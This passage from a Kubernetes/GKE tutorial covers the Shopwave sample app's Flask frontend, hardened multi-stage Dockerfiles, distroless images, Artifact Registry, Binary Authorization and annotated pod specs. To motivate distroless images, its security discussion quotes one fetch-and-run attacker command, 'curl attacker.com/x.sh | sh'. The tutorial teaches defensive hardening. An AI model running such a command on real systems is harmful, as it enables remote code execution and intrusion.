ORDERS_URL = os.getenv("ORDERS_URL", "http://orders:8080")

logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                    format='{"severity":"%(levelname)s","service":"frontend","message":"%(message)s"}')
log = logging.getLogger(SERVICE)

app = Flask(__name__)

REQUESTS = Counter("shopwave_requests_total", "Total requests",
                   ["service", "method", "endpoint", "status"])
LATENCY = Histogram("shopwave_request_duration_seconds", "Request latency",
                    ["service", "endpoint"])

_shutting_down = False
_started_at = time.time()

PAGE = """<!doctype html>
<html><head><title>Shopwave</title>
<style>
 body{font-family:system-ui,sans-serif;max-width:900px;margin:40px auto;padding:0 20px}
 h1{color:#0b7a3b} .card{border:1px solid #ddd;border-radius:8px;padding:16px;margin:12px 0}
 .meta{color:#666;font-size:13px;margin-top:24px;border-top:1px solid #eee;padding-top:12px}
 .price{color:#0b7a3b;font-weight:600}
</style></head><body>
<h1>Shopwave</h1>
{% if error %}<p style="color:#b00">Catalog unavailable: {{ error }}</p>{% endif %}
{% for p in products %}
 <div class="card">
  <strong>{{ p.name }}</strong> — <span class="price">₹{{ '%.2f'|format(p.price_paise/100) }}</span>
  <div style="color:#555">{{ p.description }}</div>
  <code>{{ p.sku }}</code>
 </div>
{% endfor %}
<div class="meta">
 served by <code>{{ pod }}</code> · zone <code>{{ zone }}</code> · version <code>{{ version }}</code>
</div>
</body></html>"""


@app.get("/healthz")
def healthz():
    return jsonify(status="alive", pod=POD_NAME,
                   uptime=round(time.time() - _started_at, 1)), 200


@app.get("/startupz")
def startupz():
    return jsonify(status="started"), 200


@app.get("/readyz")
def readyz():
    """Readiness checks catalog because a frontend that cannot render the
    catalogue is useless. It does NOT check orders - checkout being down
    should not take the whole storefront out of the load balancer."""
    if _shutting_down:
        return jsonify(status="draining"), 503
    try:
        r = requests.get(f"{CATALOG_URL}/healthz", timeout=2)
        if r.status_code == 200:
            return jsonify(status="ready", catalog="up"), 200
        return jsonify(status="not-ready", catalog=r.status_code), 503
    except Exception as e:
        return jsonify(status="not-ready", catalog="unreachable", error=str(e)), 503


@app.get("/metrics")
def metrics():
    return generate_latest(), 200, {"Content-Type": CONTENT_TYPE_LATEST}


@app.get("/")
def index():
    t0 = time.time()
    try:
        data = requests.get(f"{CATALOG_URL}/api/products", timeout=3).json()
        html = render_template_string(PAGE, products=data["products"], error=None,
                                      pod=POD_NAME, zone=ZONE, version=VERSION)
        REQUESTS.labels(SERVICE, "GET", "/", "200").inc()
    except Exception as e:
        html = render_template_string(PAGE, products=[], error=str(e),
                                      pod=POD_NAME, zone=ZONE, version=VERSION)
        REQUESTS.labels(SERVICE, "GET", "/", "503").inc()
    LATENCY.labels(SERVICE, "/").observe(time.time() - t0)
    return html


@app.post("/api/checkout")
def checkout():
    body = request.get_json(force=True, silent=True) or {}
    try:
        r = requests.post(f"{ORDERS_URL}/api/orders", json=body, timeout=15)
        return jsonify(r.json()), r.status_code
    except requests.Timeout:
        return jsonify(error="checkout timed out"), 504


@app.get("/api/info")
def info():
    return jsonify(service=SERVICE, version=VERSION, pod=POD_NAME, zone=ZONE)


@app.get("/burn")
def burn():
    """Load generator target for HPA demos. Burns CPU for N ms."""
    ms = int(request.args.get("ms", "200"))
    end = time.time() + ms / 1000.0
    x = 0
    while time.time() < end:
        x += 1
    return jsonify(iterations=x, pod=POD_NAME)


def on_sigterm(signum, frame):
    global _shutting_down
    log.info("SIGTERM: draining")
    _shutting_down = True
    time.sleep(int(os.getenv("DRAIN_SECONDS", "10")))
    sys.exit(0)


signal.signal(signal.SIGTERM, on_sigterm)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

> **Read `frontend`'s readiness carefully.** It checks `catalog` but **not** `orders`. That is a deliberate blast-radius decision: a storefront that cannot list products is useless and should leave the LB; a storefront where *checkout* is broken should still serve browsing traffic. Cascading readiness — where every service checks every dependency — turns one failed database into a **total, cluster-wide outage** because every pod in the chain simultaneously reports NotReady. **Readiness should reflect *your* ability to do *your* job, not the health of the world.** This is a top-tier interview point.


---

# Part 5 — Container Images

## 5.1 The production Dockerfile

`app/catalog/Dockerfile` — the same pattern for every service:

```dockerfile
# syntax=docker/dockerfile:1.7

# ---------- stage 1: build ----------
FROM python:3.12-slim AS builder

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PIP_NO_CACHE_DIR=1 \
    PIP_DISABLE_PIP_VERSION_CHECK=1

WORKDIR /build

# Build-only dependencies. These never reach the final image.
RUN apt-get update && apt-get install -y --no-install-recommends \
        gcc \
        libpq-dev \
        python3-dev \
    && rm -rf /var/lib/apt/lists/*

# Copy requirements FIRST and alone. This layer is cached until
# requirements.txt itself changes - so a code edit does not trigger
# a full dependency reinstall. Layer ordering is a build-speed decision.
COPY requirements.txt .
RUN pip install --prefix=/install -r requirements.txt

# ---------- stage 2: runtime ----------
FROM python:3.12-slim

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    PATH="/usr/local/bin:$PATH"

# Runtime library only - libpq5, not libpq-dev. No compiler in the final image.
RUN apt-get update && apt-get install -y --no-install-recommends \
        libpq5 \
        curl \
    && rm -rf /var/lib/apt/lists/* \
    && apt-get purge -y --auto-remove

# Non-root user with a fixed, explicit UID.
# 10001 is arbitrary but MUST be numeric in the manifest (see note below).
RUN groupadd --gid 10001 shopwave \
    && useradd --uid 10001 --gid 10001 --no-create-home --shell /usr/sbin/nologin shopwave

COPY --from=builder /install /usr/local

WORKDIR /app
COPY --chown=10001:10001 app.py gunicorn.conf.py ./

# Read-only root filesystem is enforced in the manifest; the app needs
# writable /tmp, which the manifest supplies as an emptyDir.
USER 10001:10001

EXPOSE 8080

# OCI labels - these are what your SBOM, your registry UI and your
# incident responder actually read.
ARG GIT_SHA=unknown
ARG BUILD_DATE=unknown
ARG VERSION=0.0.0
LABEL org.opencontainers.image.title="shopwave-catalog" \
      org.opencontainers.image.description="Shopwave product catalogue service" \
      org.opencontainers.image.version="${VERSION}" \
      org.opencontainers.image.revision="${GIT_SHA}" \
      org.opencontainers.image.created="${BUILD_DATE}" \
      org.opencontainers.image.source="https://github.com/yourorg/shopwave" \
      org.opencontainers.image.vendor="Shopwave" \
      org.opencontainers.image.licenses="Apache-2.0"

ENV APP_VERSION="${VERSION}"

# NO HEALTHCHECK instruction. Kubernetes probes supersede it entirely -
# the kubelet does not read Docker HEALTHCHECK. Including one is cargo cult.

# Exec form, NOT shell form. See the PID 1 note below.
ENTRYPOINT ["gunicorn", "--config", "gunicorn.conf.py", "app:app"]
```

### Every decision, defended

**Multi-stage build.** The builder has `gcc`, `python3-dev`, `libpq-dev` — a full toolchain, ~350 MB of it. The runtime has none of that. Result: smaller image (faster pulls, faster scale-up) **and** a smaller attack surface. A compiler inside a production container is a gift to an attacker who has achieved RCE — it turns a limited foothold into arbitrary native code. This is a security argument, not just a size one, and framing it that way is what makes the answer good.

**`COPY requirements.txt` before `COPY app.py`.** Docker layers are cached by content. Copying requirements alone means the expensive `pip install` layer is reused on every build where dependencies did not change. Copy the whole directory first and **every one-line code change reinstalls every dependency**. Layer ordering is the single biggest lever on build time.

**`USER 10001:10001` — numeric, not `shopwave`.** Critical, and constantly missed:

> Kubernetes' `runAsNonRoot: true` check **cannot resolve a username**. The kubelet inspects the image config; if `USER` is a *string*, the kubelet has no way to know what UID it maps to without reading `/etc/passwd` inside the image — which it does not do. The pod is **rejected** with `Error: container has runAsNonRoot and image has non-numeric user (shopwave), cannot verify user is non-root`. The image is perfectly fine; Kubernetes just cannot prove it. **Always use a numeric UID in `USER`.** This is a real, specific, memorable gotcha that almost nobody has ready.

**Exec form `ENTRYPOINT ["gunicorn", ...]`, never `ENTRYPOINT gunicorn ...`.**

> **The PID 1 problem — the most important container fact in this document.**
>
> Shell form wraps your command in `/bin/sh -c "..."`. That makes **`sh` PID 1**, and your application a child. `sh` **does not forward signals**. When Kubernetes sends `SIGTERM` for a graceful shutdown, `sh` receives it, does nothing, and your application never hears it. The kubelet waits out the entire `terminationGracePeriodSeconds` and then `SIGKILL`s. **Every one of those beautiful graceful-shutdown handlers in Part 4 is silently dead.** You dropped in-flight requests on every single deploy and never knew.
>
> Second half: PID 1 in a container has **no default signal handlers**. In a normal process, an unhandled `SIGTERM` kills you. For PID 1, the kernel ignores signals that have no explicit handler — so a process that doesn't install a handler *cannot* be SIGTERMed at all. Our apps install one explicitly with `signal.signal(signal.SIGTERM, ...)`, which is exactly why that line exists.
>
> Third half: PID 1 is also `init` and must **reap zombies**. If your app forks and doesn't `wait()`, zombies accumulate until you exhaust the PID limit. Solution when needed: a real init like `tini`, or the pod-level `shareProcessNamespace`.

**No `HEALTHCHECK`.** The kubelet never reads it. Kubernetes probes are the mechanism. Including a Docker `HEALTHCHECK` in a K8s image is pure cargo cult, and saying so is a small, confident signal.

**OCI labels with `GIT_SHA`.** When an incident starts at 02:00, `docker inspect` (or your registry UI) telling you the exact commit that produced the running image is worth more than any dashboard.

## 5.2 The other services

`app/frontend/Dockerfile`, `app/cart/Dockerfile`, `app/notifications/Dockerfile` — identical, minus `libpq`:

```dockerfile
# syntax=docker/dockerfile:1.7
FROM python:3.12-slim AS builder
ENV PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1 PIP_NO_CACHE_DIR=1
WORKDIR /build
RUN apt-get update && apt-get install -y --no-install-recommends gcc python3-dev \
    && rm -rf /var/lib/apt/lists/*
COPY requirements.txt .
RUN pip install --prefix=/install -r requirements.txt

FROM python:3.12-slim
ENV PYTHONDONTWRITEBYTECODE=1 PYTHONUNBUFFERED=1
RUN apt-get update && apt-get install -y --no-install-recommends curl \
    && rm -rf /var/lib/apt/lists/*
RUN groupadd --gid 10001 shopwave \
    && useradd --uid 10001 --gid 10001 --no-create-home --shell /usr/sbin/nologin shopwave
COPY --from=builder /install /usr/local
WORKDIR /app
COPY --chown=10001:10001 app.py gunicorn.conf.py ./
USER 10001:10001
EXPOSE 8080
ARG GIT_SHA=unknown
ARG VERSION=0.0.0
LABEL org.opencontainers.image.revision="${GIT_SHA}" \
      org.opencontainers.image.version="${VERSION}"
ENV APP_VERSION="${VERSION}"
ENTRYPOINT ["gunicorn", "--config", "gunicorn.conf.py", "app:app"]
```

`app/orders/Dockerfile` and `app/payments/Dockerfile` — same as catalog (orders needs libpq; payments does not, but keep it uniform or trim it).

`app/notifications/Dockerfile` needs **both** entrypoints — the Deployment runs the API, the CronJob runs the script:

```dockerfile
# ... same as above through USER ...
COPY --chown=10001:10001 app.py gunicorn.conf.py digest_job.py ./
USER 10001:10001
EXPOSE 8080
# Default = the API. The CronJob overrides `command` to run the script.
ENTRYPOINT ["gunicorn", "--config", "gunicorn.conf.py", "app:app"]
```

The CronJob then sets:

```yaml
command: ["python", "digest_job.py"]
```

> **`command` overrides ENTRYPOINT. `args` overrides CMD.** That mapping is asked constantly:
>
> | Dockerfile | Kubernetes |
> |---|---|
> | `ENTRYPOINT` | `command` |
> | `CMD` | `args` |
>
> If you set `command` in a pod spec, the image's `ENTRYPOINT` **and** `CMD` are both discarded — `CMD` only ever survives as the default args to `ENTRYPOINT`. Setting only `args` keeps the ENTRYPOINT and replaces the CMD.

## 5.3 `.dockerignore` — put one in every service directory

```
.git
.gitignore
__pycache__/
*.pyc
*.pyo
*.pyd
.pytest_cache/
.venv/
venv/
.env
*.md
tests/
Dockerfile
.dockerignore
k8s/
```

> **Not optional.** The build context is **tarballed and shipped to the daemon**. Without this, `.git` — including your whole history and any credential ever committed — goes into the context, and if any layer does `COPY . .` it lands **in the image**, permanently, retrievable by anyone who can pull it. Deleting the file in a later layer does not remove it; layers are immutable and additive. This is how secrets leak from container images in the real world.

## 5.4 Distroless — the next step

For `payments`, go further:

```dockerfile
# syntax=docker/dockerfile:1.7
FROM python:3.12-slim AS builder
WORKDIR /build
RUN apt-get update && apt-get install -y --no-install-recommends gcc python3-dev \
    && rm -rf /var/lib/apt/lists/*
COPY requirements.txt .
RUN pip install --prefix=/install -r requirements.txt

FROM gcr.io/distroless/python3-debian12:nonroot
COPY --from=builder /install /usr/local
WORKDIR /app
COPY app.py gunicorn.conf.py ./
USER 65532:65532
EXPOSE 8080
ENTRYPOINT ["/usr/local/bin/gunicorn", "--config", "gunicorn.conf.py", "app:app"]
```

**What distroless removes:** no shell, no package manager, no `curl`, no `ls`, no `cat`, no libc utilities. Just your runtime and your code.

**Why that matters:** an attacker with RCE in a normal container immediately runs `curl attacker.com/x.sh | sh`. In distroless there is **no shell to run it with and no curl to fetch it**. It eliminates an entire class of post-exploitation.

**The trade-off you must state:** you **cannot `kubectl exec -it ... -- sh`**. There is no shell. Debugging requires **ephemeral containers**:

```bash
kubectl debug -n shopwave-prod payments-7d4b-xyz \
  -it --image=busybox:1.36 --target=payments -- sh
```

`--target` puts the debug container in the **same process namespace** as the target, so you can see its processes, `/proc/1/root/`, and its network. Ephemeral containers went GA in 1.25 and are the correct answer to "how do you debug a distroless container" — a question that filters candidates hard.

> **Note:** distroless breaks `exec`-based probes (there's no binary to run) — use `httpGet` probes, which we do everywhere anyway.

## 5.5 Build

```bash
cd ~/shopwave/app

export PROJECT_ID=kubernetas-console
export REGION=asia-south1
export REGISTRY=$REGION-docker.pkg.dev/$PROJECT_ID/shopwave
export GIT_SHA=$(git rev-parse --short HEAD 2>/dev/null || echo dev)
export BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
export VERSION=1.0.0

for svc in frontend catalog cart orders payments inventory notifications; do
  echo "==> building $svc"
  docker build \
    --build-arg GIT_SHA=$GIT_SHA \
    --build-arg BUILD_DATE=$BUILD_DATE \
    --build-arg VERSION=$VERSION \
    -t $REGISTRY/$svc:$VERSION \
    -t $REGISTRY/$svc:$GIT_SHA \
    ./$svc
done

docker images | grep shopwave
```

> **Tag with the git SHA, and deploy the SHA — never `latest`.** Three reasons, and you should be able to give all three:
> 1. **`latest` is not a version, it's a default.** `image: foo` means `foo:latest`. It carries no information.
> 2. **`imagePullPolicy` defaults to `Always` when the tag is `latest`, and `IfNotPresent` otherwise.** So `latest` silently changes your pull behaviour — and a registry outage now means your pods cannot start at all, because they refuse to use the cached image.
> 3. **Tags are mutable; digests are not.** Two pods of the "same" Deployment can be running **different code** if someone re-pushed the tag between their scheduling times. Your rollback to `v1.2.3` may not roll back to the code that was `v1.2.3` last week. **Immutable tags + digest pinning is the only correct answer.**

**The strongest form** — pin the digest:

```yaml
image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/payments@sha256:9f86d081...
```

A digest is the SHA-256 of the image manifest. It is **content-addressed and cannot be re-pointed**. For PCI-scoped services, this is the standard.


---

# Part 6 — Artifact Registry

## 6.1 Create the repository

```bash
gcloud artifacts repositories create shopwave \
  --repository-format=docker \
  --location=$REGION \
  --description="Shopwave container images" \
  --async

# Immutable tags: once pushed, a tag can NEVER be re-pointed.
gcloud artifacts repositories update shopwave \
  --location=$REGION \
  --immutable-tags
```

> **`--immutable-tags` is the single highest-value flag here.** It makes "someone re-pushed `v1.2.3`" **impossible**. Without it, your version tags are suggestions and your rollbacks are unreliable. With it, tag = content, forever. Enterprises turn this on and it costs nothing.

Cleanup policy — images are not free:

```bash
cat > cleanup-policy.json << 'EOF'
[
  {
    "name": "keep-tagged-releases",
    "action": {"type": "Keep"},
    "condition": {
      "tagState": "TAGGED",
      "tagPrefixes": ["v", "1.", "2."]
    }
  },
  {
    "name": "keep-recent",
    "action": {"type": "Keep"},
    "mostRecentVersions": {"keepCount": 20}
  },
  {
    "name": "delete-old-untagged",
    "action": {"type": "Delete"},
    "condition": {
      "tagState": "UNTAGGED",
      "olderThan": "30d"
    }
  }
]
EOF

gcloud artifacts repositories set-cleanup-policies shopwave \
  --location=$REGION \
  --policy=cleanup-policy.json \
  --no-dry-run
```

> **Untagged images are the silent cost centre.** Every time you re-push a tag (before immutability) or a build produces an unreferenced layer set, the old manifest becomes untagged and **still bills you**. A busy CI pipeline accumulates hundreds of GB. `Keep` rules always win over `Delete` rules, so the ordering above is safe. Always run with `--dry-run` first.

Enable vulnerability scanning:

```bash
gcloud services enable containerscanning.googleapis.com
```

## 6.2 Authenticate and push

```bash
gcloud auth configure-docker $REGION-docker.pkg.dev

for svc in frontend catalog cart orders payments inventory notifications; do
  docker push $REGISTRY/$svc:$VERSION
  docker push $REGISTRY/$svc:$GIT_SHA
done
```

What `configure-docker` does: writes a `credHelper` entry into `~/.docker/config.json` pointing at `docker-credential-gcloud`. Docker then calls that helper for a **short-lived OAuth token** on every push. **No static password is stored.** This is the same "no long-lived credentials" principle as Workload Identity, applied to the build host.

> **Corporate proxy note.** If `docker push` fails with `x509: certificate signed by unknown authority`, the TLS-inspecting proxy is re-signing the registry's certificate. Push from the bastion VM inside the VPC. Do not disable TLS verification — that "fix" is how a credential gets stolen.

## 6.3 Verify and scan

```bash
gcloud artifacts docker images list $REGISTRY --include-tags

# Vulnerability findings
gcloud artifacts docker images describe \
  $REGISTRY/payments:$VERSION --show-package-vulnerability

# Fail a build on CRITICAL - this is the CI gate
gcloud artifacts docker images list $REGISTRY/payments \
  --show-occurrences \
  --format="value(package_vulnerability_summary.vulnerabilities.CRITICAL)"
```

Automatic scanning triggers on push and re-scans continuously for **30 days** as new CVEs are published against packages you already shipped. That last part is the good answer: **a vulnerability scan is not a point-in-time gate, it's a continuous subscription.** An image that was clean on Monday is critical on Thursday because the CVE was published Wednesday, and nothing about your image changed.

## 6.4 Node access to the registry

Nodes pull images using the **node's** service account. Least privilege:

```bash
export NODE_SA=$(gcloud container clusters describe $CLUSTER --region=$REGION \
  --format="value(nodeConfig.serviceAccount)")

gcloud artifacts repositories add-iam-policy-binding shopwave \
  --location=$REGION \
  --member="serviceAccount:$NODE_SA" \
  --role="roles/artifactregistry.reader"
```

> **If you did nothing, this already works — and that's the problem.** The default node SA is the **Compute Engine default service account**, which holds **`roles/editor` on the entire project**. It can read every bucket, every secret, delete VMs, and modify IAM. Combine that with the metadata-server escalation from Part 2 and **any pod RCE becomes project-wide compromise**.
>
> The correct enterprise setup — do this at cluster creation:
> ```bash
> gcloud iam service-accounts create gke-node-sa \
>   --display-name="GKE node service account"
>
> for role in roles/logging.logWriter \
>             roles/monitoring.metricWriter \
>             roles/monitoring.viewer \
>             roles/stackdriver.resourceMetadata.writer \
>             roles/artifactregistry.reader; do
>   gcloud projects add-iam-policy-binding $PROJECT_ID \
>     --member="serviceAccount:gke-node-sa@$PROJECT_ID.iam.gserviceaccount.com" \
>     --role="$role"
> done
> ```
> then pass `--service-account=gke-node-sa@$PROJECT_ID.iam.gserviceaccount.com` on every node pool. **Five roles. That is all a node needs.** This is one of the most valuable things you can say about GKE security, and it is a very common real-world finding in security audits.

**Registry auth for a *different* project's registry** is the other half of this question, and the answer is: cross-project IAM binding, **not** an `imagePullSecret`. `imagePullSecrets` with a JSON key is the anti-pattern:

```yaml
# DON'T do this on GKE if you can use IAM instead
imagePullSecrets:
  - name: gcr-json-key
```

You'd only reach for it with a genuinely external registry (Docker Hub private repos, Quay).

## 6.5 Binary Authorization — only signed images run

This is what "enterprise" actually looks like at the admission layer.

```bash
# Attestor identity
gcloud kms keyrings create shopwave-attestors --location=$REGION
gcloud kms keys create build-attestor \
  --keyring=shopwave-attestors --location=$REGION \
  --purpose=asymmetric-signing \
  --default-algorithm=rsa-sign-pkcs1-4096-sha512

gcloud container binauthz attestors create build-attestor \
  --attestation-authority-note=projects/$PROJECT_ID/notes/build-note \
  --attestation-authority-note-project=$PROJECT_ID

# Enforce on the cluster
gcloud container clusters update $CLUSTER --region=$REGION \
  --binauthz-evaluation-mode=PROJECT_SINGLETON_POLICY_ENFORCE
```

Policy (`binauthz-policy.yaml`):

```yaml
defaultAdmissionRule:
  evaluationMode: REQUIRE_ATTESTATION
  enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
  requireAttestationsBy:
    - projects/kubernetas-console/attestors/build-attestor

clusterAdmissionRules:
  asia-south1.shopwave-prod:
    evaluationMode: REQUIRE_ATTESTATION
    enforcementMode: ENFORCED_BLOCK_AND_AUDIT_LOG
    requireAttestationsBy:
      - projects/kubernetas-console/attestors/build-attestor

admissionWhitelistPatterns:
  - namePattern: gcr.io/google_containers/*
  - namePattern: gke.gcr.io/*
  - namePattern: k8s.gcr.io/*
  - namePattern: registry.k8s.io/*
  - namePattern: gcr.io/gke-release/*
  - namePattern: gcr.io/distroless/*
```

```bash
gcloud container binauthz policy import binauthz-policy.yaml
```

**What this does:** an **admission webhook** — a `ValidatingAdmissionWebhook` run by Google — intercepts every pod creation, resolves the image to its **digest**, and checks for a valid cryptographic **attestation** signed by your attestor. No attestation → **pod rejected at admission**.

The chain: CI builds → scans → **only if scan passes**, signs an attestation over the digest → pushes. An image someone built on a laptop has no attestation and **cannot run in prod**, no matter who they are or what RBAC they hold.

> **The whitelist is load-bearing.** Forget `gke.gcr.io/*` and you block **GKE's own system pods** — `kube-proxy`, `gke-metadata-server`, the CSI drivers, the metrics server. The cluster does not recover on its own, because the pods that would recover it are also blocked. **Always roll out Binary Authorization in `DRYRUN_AUDIT_LOG_ONLY` first**, read the audit logs for a week, and only then flip to `ENFORCED_BLOCK_AND_AUDIT_LOG`. Describing that rollout is worth more in an interview than describing the feature.

**Break-glass:** an annotation that bypasses the policy and fires a **loud** audit event:

```yaml
metadata:
  annotations:
    alpha.image-policy.k8s.io/break-glass: "true"
```

It's meant to be used once a year at 04:00 and to generate a postmortem.

## 6.6 The full supply chain

```
git commit
   ↓
CI: build with --build-arg GIT_SHA
   ↓
CI: unit tests
   ↓
docker push :$GIT_SHA   →  Artifact Registry (immutable tags)
   ↓
Automatic vulnerability scan (and continuous re-scan for 30 days)
   ↓
Gate: any CRITICAL → FAIL the build
   ↓
CI signs an attestation over the DIGEST with the KMS key
   ↓
Deploy manifest referencing image@sha256:...
   ↓
Binary Authorization admission webhook verifies the attestation
   ↓
Pod admitted → kubelet pulls by digest → runs
```

Being able to draw that on a whiteboard, and name **which step blocks which attack**, is a Staff-level answer:

| Attack | Blocked by |
|---|---|
| Developer pushes untested code | Attestation only signed after CI passes |
| Known-vulnerable base image | Scan gate |
| Someone re-points a tag to malicious content | Immutable tags + digest pinning |
| Attacker with cluster RBAC deploys their own image | Binary Authorization — no attestation |
| Registry compromise swaps an image | Digest pinning — content-addressed |
| Credential theft from the build host | Short-lived OAuth via credHelper, no static password |
| Pod RCE → node SA → project takeover | Least-privilege node SA + `GKE_METADATA` |


---

# Part 7 — The Pod

Everything else in Kubernetes exists to create, place, or delete pods. This part is asked in every interview.

## 7.1 What a Pod actually is

A Pod is **one or more containers sharing a set of Linux namespaces**. Specifically, containers in a pod share:

| Namespace | Shared? | Consequence |
|---|---|---|
| **Network** | **Yes** | Same IP, same port space. Containers talk over `localhost`. Two containers cannot both bind :8080. |
| **IPC** | **Yes** | Shared SysV IPC / POSIX message queues. |
| **UTS** | **Yes** | Same hostname. |
| **PID** | **No** (by default) | Each container sees only its own processes. `shareProcessNamespace: true` changes this. |
| **Mount** | **No** | Each has its own filesystem; shared data needs an explicit shared **volume**. |
| **Cgroup** | Per-container limits under a pod-level cgroup parent | |

**The pause container.** Every pod has a hidden `pause` container you never wrote. Its entire job: start first, create the network/IPC/UTS namespaces, and then **sleep forever**, holding those namespaces open. Every other container in the pod joins them. It matters because it's why a container can crash and restart **keeping the same pod IP** — the pause container never died, so the namespace persisted. If the pause container dies, the whole pod is gone.

> **"Why does a pod keep its IP across container restarts?"** → The pause container owns the network namespace and doesn't restart. That's the answer.

## 7.2 A complete pod spec, annotated

`08-workloads/catalog-pod-reference.yaml` — we won't apply this directly (Deployments do that in Part 8), but every field appears here once:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: catalog-reference
  namespace: shopwave-prod
  labels:
    app.kubernetes.io/name: catalog
    app.kubernetes.io/instance: catalog-prod
    app.kubernetes.io/version: "1.0.0"
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: shopwave
  annotations:
    prometheus.io/scrape: "true"
    prometheus.io/port: "8080"
    prometheus.io/path: "/metrics"
spec:
  serviceAccountName: catalog
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 30
  enableServiceLinks: false

  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    runAsGroup: 10001
    fsGroup: 10001
    fsGroupChangePolicy: OnRootMismatch
    seccompProfile:
      type: RuntimeDefault

  initContainers:
    - name: wait-for-postgres
      image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/catalog:1.0.0
      command:
        - python
        - -c
        - |
          import socket, time, sys, os
          host = os.getenv("DB_HOST", "postgres")
          for i in range(60):
              try:
                  socket.create_connection((host, 5432), timeout=2).close()
                  print("postgres reachable")
                  sys.exit(0)
              except OSError as e:
                  print(f"waiting for postgres ({i}): {e}", flush=True)
                  time.sleep(2)
          print("postgres never became reachable")
          sys.exit(1)
      env:
        - name: DB_HOST
          value: postgres
      resources:
        requests:
          cpu: 50m
          memory: 64Mi
        limits:
          cpu: 100m
          memory: 128Mi
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL

  containers:
    - name: catalog
      image: asia-south1-docker.pkg.dev/kubernetas-console/shopwave/catalog:1.0.0
      imagePullPolicy: IfNotPresent

      ports:
        - name: http
          containerPort: 8080
          protocol: TCP

      env:
        - name: POD_NAME
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        - name: POD_NAMESPACE
          valueFrom:
            fieldRef:
              fieldPath: metadata.namespace
        - name: POD_IP
          valueFrom:
            fieldRef:
              fieldPath: status.podIP
        - name: NODE_NAME
          valueFrom:
            fieldRef:
              fieldPath: spec.nodeName
        - name: ZONE
          valueFrom:
            fieldRef:
              fieldPath: metadata.labels['topology.kubernetes.io/zone']
        - name: CPU_LIMIT
          valueFrom:
            resourceFieldRef:
              containerName: catalog
              resource: limits.cpu
              divisor: "1"
        - name: MEMORY_LIMIT
          valueFrom:
            resourceFieldRef:
              containerName: catalog
              resource: limits.memory
              divisor: 1Mi
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: postgres-credentials
              key: password
      envFrom:
        - configMapRef:
            name: catalog-config

      resources:
        requests:
          cpu: 100m
          memory: 192Mi
          ephemeral-storage: 256Mi
        limits:
          cpu: 500m
          memory: 384Mi
          ephemeral-storage: 1Gi

      startupProbe:
        httpGet:
          path: /startupz
          port: http
        initialDelaySeconds: 0
        periodSeconds: 3
        timeoutSeconds: 2
        failureThreshold: 30       # 30 * 3s = 90s budget to start

      livenessProbe:
        httpGet:
          path: /healthz
          port: http
        periodSeconds: 10
        timeoutSeconds: 2
        failureThreshold: 3
        successThreshold: 1

      readinessProbe:
        httpGet:
          path: /readyz
          port: http
        periodSeconds: 5
        timeoutSeconds: 2
        failureThreshold: 3
        successThreshold: 1

      lifecycle:
        preStop:
          exec:
            command:
              - /bin/sh
              - -c
              - "sleep 5"

      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        runAsNonRoot: true
        runAsUser: 10001
        capabilities:
          drop:
            - ALL

      volumeMounts:
        - name: tmp
          mountPath: /tmp
        - name: cache
          mountPath: /var/cache/shopwave

  volumes:
    - name: tmp
      emptyDir:
        medium: Memory
        sizeLimit: 64Mi
    - name: cache
      emptyDir:
        sizeLimit: 256Mi

  nodeSelector:
    pool: app

  tolerations: []

  topologySpreadConstraints:
    - maxSkew: 1
      topologyKey: topology.kubernetes.io/zone
      whenUnsatisfiable: ScheduleAnyway
      labelSelector:
        matchLabels:
          app.kubernetes.io/name: catalog

  dnsPolicy: ClusterFirst
  restartPolicy: Always
```

## 7.3 Init containers

Init containers run **to completion, sequentially, before any app container starts**. If one fails, the pod restarts it per `restartPolicy` (so `Always` → retries forever, which is what you want for "wait for the DB").

Properties that get asked:

- They run **in order**, one at a time. App containers all start **in parallel** afterwards.
- Each must **exit 0** before the next begins.
- They see the **same volumes and network namespace**, so they can prepare state.
- They **cannot have readiness probes** — "ready" is meaningless for something that must terminate.
- **Resource accounting is different**: the pod's effective request is `max(largest init container request, sum of app container requests)`, **not** the sum of everything. Because inits are sequential and finished before the apps run, the scheduler only needs to reserve the peak. **This is a fantastic interview question** and almost nobody gets it right.

Legitimate uses: wait for a dependency, run a schema migration, render a config file into a shared `emptyDir`, `chown` a volume, fetch a secret.

> **Anti-pattern:** using an init container to wait for a dependency **instead of** designing readiness properly. `wait-for-postgres` above is fine for ordering the *first* boot, but the app must **still** tolerate Postgres disappearing at runtime — the init container ran once, at t=0, and will never help you again. Init containers order startup; they do not provide resilience.

### Native sidecars — the 1.29 change worth knowing

Historically, a sidecar (log shipper, proxy) was just another entry in `containers`. Two chronic problems:

1. **Startup race** — the app container could start before the proxy was ready and fail its first calls.
2. **Job never completes** — in a Job, the main container exits, the sidecar runs forever, the pod never reaches `Completed`. This plagued Istio + Jobs for years.

Kubernetes 1.28 (alpha) / **1.29 (beta, on by default in GKE 1.29+)** added **native sidecars**: an **init container with `restartPolicy: Always`**.

```yaml
initContainers:
  - name: envoy-sidecar
    image: envoyproxy/envoy:v1.30-latest
    restartPolicy: Always          # <-- this makes it a native sidecar
    startupProbe:
      httpGet:
        path: /ready
        port: 15021
```

Semantics: it starts **in the init sequence** (so it's up before app containers), it **keeps running** alongside them, and it's **terminated after** the app containers on shutdown — and crucially it **does not block Job completion**.

> **"How do you run a sidecar that must start before the app and not block a Job from completing?"** → native sidecars, init container with `restartPolicy: Always`, 1.29+. Very few candidates know this exists.

## 7.4 The three probes — the table you must have memorised

| | **startupProbe** | **livenessProbe** | **readinessProbe** |
|---|---|---|---|
| Question | "Have I finished booting?" | "Is my process wedged?" | "Should I get traffic?" |
